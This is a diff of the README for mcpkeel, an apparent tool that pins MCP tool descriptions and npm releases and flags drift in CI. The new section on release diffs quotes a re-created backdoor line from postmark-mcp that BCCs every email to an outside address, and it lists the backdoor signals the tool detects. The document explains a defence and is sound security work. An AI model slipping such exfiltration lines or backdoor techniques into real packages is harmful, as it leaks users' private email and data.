@@ -1,20 +1,36 @@
-# mcpkeel
+<div align="center">
+  <img src="docs/assets/logo.svg" alt="" width="72" height="72" />
+  <h1>mcpkeel</h1>
+  <p><strong>The lockfile for MCP.</strong></p>
+  <p>An MCP server can rewrite the tool descriptions your agent trusts, at any time, and nothing tells you.<br />mcpkeel pins them in a file you commit and fails the build when they change.</p>
+  <p>
+    <a href="https://mcpkeel.app">Website</a> ·
+    <a href="#commands">Commands</a> ·
+    <a href="#in-ci">GitHub Action</a> ·
+    <a href="https://mcpkeel.app/drift">Drift feed</a> ·
+    <a href="#measured">Measured</a> ·
+    <a href="https://mcpkeel.app/security">Security</a>
+  </p>
+  <p>
+    <a href="https://www.npmjs.com/package/mcpkeel"><img src="https://img.shields.io/npm/v/mcpkeel?style=flat-square&amp;labelColor=10202C&amp;color=2D6286&amp;label=npm" alt="npm version" /></a>
+    <a href="https://github.com/mcpkeel/mcpkeel/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/mcpkeel/mcpkeel/ci.yml?branch=main&amp;style=flat-square&amp;labelColor=10202C&amp;label=CI" alt="CI status" /></a>
+    <a href="docs/EVIDENCE.md#releases-are-built-and-signed-in-ci"><img src="https://img.shields.io/badge/npm-provenance-2D6286?style=flat-square&amp;labelColor=10202C" alt="Signed with npm provenance" /></a>
+    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-2D6286?style=flat-square&amp;labelColor=10202C" alt="MIT license" /></a>
+    <a href="https://nodejs.org"><img src="https://img.shields.io/badge/node-22%2B-2D6286?style=flat-square&amp;labelColor=10202C" alt="Node 22 or later" /></a>
+  </p>
+</div>
 
-[![npm](https://img.shields.io/npm/v/mcpkeel.svg)](https://www.npmjs.com/package/mcpkeel)
-[![CI](https://github.com/mcpkeel/mcpkeel/actions/workflows/ci.yml/badge.svg)](https://github.com/mcpkeel/mcpkeel/actions/workflows/ci.yml)
-[![provenance](https://img.shields.io/badge/npm-provenance-blue.svg)](docs/EVIDENCE.md#releases-are-built-and-signed-in-ci)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Node 22+](https://img.shields.io/badge/node-22%2B-brightgreen.svg)](https://nodejs.org)
-
-**The lockfile for MCP.** An MCP server can rewrite the tool descriptions your agent trusts, at any time, and nothing tells you. mcpkeel pins them in a file you commit and fails the build when they change.
+<p align="center">
+  <img src="docs/assets/demo.png" alt="Output of mcpkeel verify: a tool description changed after it was pinned, graded critical with the checks that fired, and the build fails." width="100%" />
+  <br />
+  <sub>Real output of <code>npx mcpkeel demo</code>, with the quoted excerpts under each check left out.</sub>
+</p>
 
 ```sh
 npx mcpkeel demo      # watch it catch a rug pull, on a local server, in seconds
 npx mcpkeel init      # snapshot every server in your MCP config into mcp.lock
 npx mcpkeel verify    # in CI: exit 1 if anything changed
 ```
-
-Website: [mcpkeel.app](https://mcpkeel.app)
 
 ## TL;DR
 
@@ -84,6 +100,8 @@ Review the changes, then run `mcpkeel update` to accept them.
 | `--probe` | Reads each server two more times, to catch servers that change their answer. See [A second reading](#a-second-reading). |
 | `--explain` | Has a model you choose read each changed text and adjust its severity: Claude by default, or any OpenAI-compatible endpoint, local ones included. See [A review by a model](#a-review-by-a-model). |
 | `--no-resolve` | Skips looking up the release each package launcher runs. See [What runs](#what-runs). |
+| `--no-release-diff` | Reports a new npm release without reading what its code adds. See [What a new release adds](#what-a-new-release-adds). |
+| `--release-diff` | `diff <old> <new>`: also reads what each new npm release adds. Off by default, so comparing two lockfiles stays offline. |
 | `--fail-on <level>` | `verify`: the lowest severity that fails the run. The default is `low`, so any drift fails. |
 | `--report <file>` | Also appends a Markdown report to a file, for pull request bodies and job summaries. |
 | `--policy <file>` | Decisions about findings, each with a reason. Defaults to `mcpkeel.json` next to the lockfile. See [Decisions about findings](#decisions-about-findings). |
@@ -170,6 +188,7 @@ Every change and every built-in check has a code that keeps its meaning across v
 | `MK105` | The version the server reports changed. | MCP04:2025 |
 | `MK106` | The launcher runs a different release of its package. | MCP04:2025 |
 | `MK107` | A published release now has different contents. | MCP04:2025 |
+| `MK108` | A new release adds what a backdoor needs: an install script, a hidden recipient, a process, `eval` or a decoded string. | MCP04:2025 |
 | `MK110` | A tool was added. | MCP02:2025 |
 | `MK111` | A tool was removed. | — |
 | `MK112` | A tool's description changed. | MCP03:2025 |
@@ -241,6 +260,25 @@ So for servers started through a package launcher, mcpkeel also pins the release
 A different release is high. The same version with different contents is critical: registries do not let a published version change. The lookup happens before the server is started and never follows a redirect.
 
 A version range such as `some-server@^1.0.0` cannot be pinned to one release, and `init` says so. A lockfile written before 0.3.0 has no pins; `verify` says which servers lack one, and `mcpkeel update` adds them. If a registry cannot be reached, the run is incomplete and exits `2`. `--no-resolve` turns the lookup off.
+
+### What a new release adds
+
+A new version number says nothing about what changed. The backdoored `postmark-mcp` 1.0.16 differed from 1.0.15 by one line, which copied every email the agent sent to an outside address. So when an npm package's release changes, `verify` reads both releases and reports what the new one adds. On a re-creation of that release, with the same added line (the real one was taken down from npm):
+
+```
+  CRITICAL  package postmark-mcp postmark-mcp@1.0.16 adds a hidden (BCC) recipient
+            1.0.15 → 1.0.16: 1 file changed, 0 added, 0 removed, 1 line of code added
+            ! adds a hidden (BCC) recipient: bcc (index.js)
+            + adds an email address: phan@giftshop.club (index.js)
+            lines added:
+                + Bcc: 'phan@giftshop.club', index.js
+```
+
+Five things make the change critical (`MK108`), because none of them appeared in a single one of the 98 real releases measured below: an install script, a hidden (BCC) recipient, a `child_process` import, `eval`, and a string decoded from base64. New email addresses, hosts, IP addresses, dependencies and `new Function` are listed as context, without raising the severity, because ordinary releases add them too. When a release adds 40 lines or fewer, they are shown. Each item is compared with the old release, so what was already there is not reported again.
+
+Both archives are downloaded from the registry that was asked, never from a host the registry's answer points to, and each is checked against its pinned digest before a byte of it is read. They are unpacked in memory, within fixed limits on size and entries, and nothing in them is run or written to disk. If they cannot be read, the release change is reported at its own severity, with the reason. `--no-release-diff` or `--no-resolve` turns this off. `mcpkeel diff <old> <new>` does it only with `--release-diff`; the GitHub Action's `update-pr` mode passes it, so the pull request shows what each new release adds.
+
+This reads the package itself, not its dependencies, and it only covers npm.
 
 ## A review by a model
 
@@ -379,7 +417,7 @@ jobs:
       - uses: actions/setup-node@v7
         with:
           node-version: 22
-      - uses: mcpkeel/mcpkeel@v0.5.0
+      - uses: mcpkeel/mcpkeel@v0.6.0
         with:
           probe: true
           explain: true
@@ -410,7 +448,7 @@ jobs:
       - uses: actions/setup-node@v7
         with:
           node-version: 22
-      - uses: mcpkeel/mcpkeel@v0.5.0
+      - uses: mcpkeel/mcpkeel@v0.6.0
         with:
           mode: update-pr
           explain: true
@@ -437,7 +475,7 @@ jobs:
       - uses: actions/setup-node@v7
         with:
           node-version: 22
-      - uses: mcpkeel/mcpkeel@v0.5.0
+      - uses: mcpkeel/mcpkeel@v0.6.0
         with:
           sarif: mcpkeel.sarif
       - uses: github/codeql-action/upload-sarif@v4
@@ -451,7 +489,7 @@ Code scanning is available on public repositories, and on private ones with GitH
 ### Without the action
 
 ```yaml
-      - run: npx mcpkeel@0.5.0 verify --report "$GITHUB_STEP_SUMMARY"
+      - run: npx mcpkeel@0.6.0 verify --report "$GITHUB_STEP_SUMMARY"
 ```
 
 ### Settings worth getting right
@@ -459,7 +497,7 @@ Code scanning is available on public repositories, and on private ones with GitH
 - **Do not run `--fail-on critical` on the built-in checks alone.** Critical means a pattern matched, and a careful attacker avoids patterns. A plain description change is high. Keep the default, or use `--fail-on medium` together with `--explain`.
 - **Pin the versions of the servers you start.** `npx -y some-server` fetches whatever is newest on every run, so each upstream release fails `verify` as a release nobody chose. `npx -y some-server@1.4.2` only changes when you change it. `mcpkeel init` points out the unpinned ones.
 - **Pin what depends on the machine.** Some servers write details of the machine they run on into their definitions: `mcp-server-time` puts the local timezone in its parameter descriptions. A lockfile written on a laptop then drifts on a runner in another timezone. Set those values in the config, for example `"args": ["mcp-server-time==2026.11.11", "--local-timezone", "UTC"]`, before you run `init`.
-- **Pin the action by commit in workflows that can write.** `mcpkeel/mcpkeel@<commit> # v0.5.0` cannot change under you; a tag can be moved. [mcpkeel-example](https://github.com/mcpkeel/mcpkeel-example) pins every action this way.
+- **Pin the action by commit in workflows that can write.** `mcpkeel/mcpkeel@<commit> # v0.6.0` cannot change under you; a tag can be moved. [mcpkeel-example](https://github.com/mcpkeel/mcpkeel-example) pins every action this way.
 - **Run on a schedule as well as on pull requests.** A remote server changes without any commit on your side.
 - **`init` and `verify` start the servers in the config they read.** Each `command` runs with the permissions of the job. On a pull request, that is the config from the pull request, so the job deserves the same trust as one that runs the pull request's tests: no secrets on pull requests from forks, and a read-only token.
 
@@ -494,6 +532,21 @@ Claude Opus 5.5, on the full sets, graded 475 of 485 poisoned tools adversarial 
 
 Two things this does not show. First, the limits on lowering are not what stopped the rug pulls: 28 of the 30 pass every one of them, so a model fooled into "cosmetic" would have lowered them. Run with a judge that is always wrong, the eval shows exactly that, and CI runs it that way on every change (`--judge worst --check`), so a change to the limits that lets more through fails the build. Second, the review removes little noise: of the 83 real changes, the limits allow lowering 27, and the models lowered 6 or 7. It is a second reading for the wording, not a filter that makes drift quiet.
 
+### What a new release adds
+
+`eval/releases.mjs` reads the last eight stable releases of 14 popular MCP servers on npm, 98 pairs of consecutive releases, and the same servers' latest release with one malicious change injected, in 11 shapes modelled on `postmark-mcp` and common npm attacks: 154 in all. The real releases are pinned by digest in [`eval/data/npm-releases.json`](eval/data/npm-releases.json); the injected ones are synthetic, since the real malicious releases were taken down.
+
+| What | Result |
+| --- | --- |
+| Real releases graded critical | 0 of 98 |
+| Injected releases graded critical | 95 of 154 (61.7%) |
+| ... the `postmark-mcp` BCC, and the same address assembled from pieces or decoded from base64 | 42 of 42 |
+| ... `eval`, `new Function` on a decoded string, an install script | 14 of 14 each |
+| ... `child_process` | 11 of 14: three servers already import it |
+| ... an outside address as a default, the environment posted to a new host or an IP address, a look-alike dependency | 0 of 56, each listed with its line |
+
+What is not graded is still shown to the reviewer: the injected line is listed, as a signal or among the lines added, in 152 of the 154. The other two are `child_process` calls in servers that already import it, in releases too large to excerpt. The signals that also fire on real releases (new hosts on 7 of 98, new dependencies on 11) are why they stay context. The graded set was chosen on these same 98 pairs, so 0 of 98 is not a false-positive rate measured on releases it has not seen. Run it with `npm run build && node eval/releases.mjs`; CI runs it with `--check`.
+
 ### Drift feed
 
 Every night, CI starts nine popular public MCP servers the way most configs do, with no version pinned, and compares them with the night before. The feed is at [mcpkeel.app/drift](https://mcpkeel.app/drift), and the data behind it, with mcpkeel's report for each day, is in the [`canary-data`](https://github.com/mcpkeel/mcpkeel/tree/canary-data) branch. In its first month, what these servers send changed on 13 of 30 nights, and none of the changes tripped a built-in check: ordinary releases, each one still new text for an agent to read. The servers are in [`canary/.mcp.json`](canary/.mcp.json).
@@ -503,7 +556,7 @@ The servers are third-party code at whatever version they ship that night, so th
 ## What it does not do
 
 - **It trusts what you pin.** `mcpkeel init` records whatever the server sends that day. Read the lockfile before you commit it. `init` points out anything that trips a check, and tool names that two servers share.
-- **It checks definitions, not behavior.** A server can keep its descriptions and change what a tool does. The backdoored `postmark-mcp` package differed from the original by one line of code. mcpkeel pins the release that runs, so a new release fails `verify`, but it does not read the code. Reviewing a release before you accept it is still yours to do.
+- **It checks definitions, not behavior.** A server can keep its descriptions and change what a tool does. mcpkeel pins the release that runs, so a new release fails `verify`, and for npm it reads what the new code adds. That is a reading of the text, not of what the code does when it runs: a backdoor written as ordinary code, sending data to a new host, is listed but not graded critical. It does not read dependencies, or PyPI and container releases. Reviewing a release before you accept it is still yours to do.
 - **It checks when you run it.** It is not a proxy, and it does not sit between your agent and the server. `--probe` narrows the gap, but a server that waits for a particular day will pass.
 - **It pins what a plain client sees.** mcpkeel connects without optional client capabilities such as sampling. A server that lists extra tools for clients that have them will show mcpkeel the shorter list.
 - **It does not read tool results.** Instructions can also arrive in what a tool returns. That needs a runtime guard.
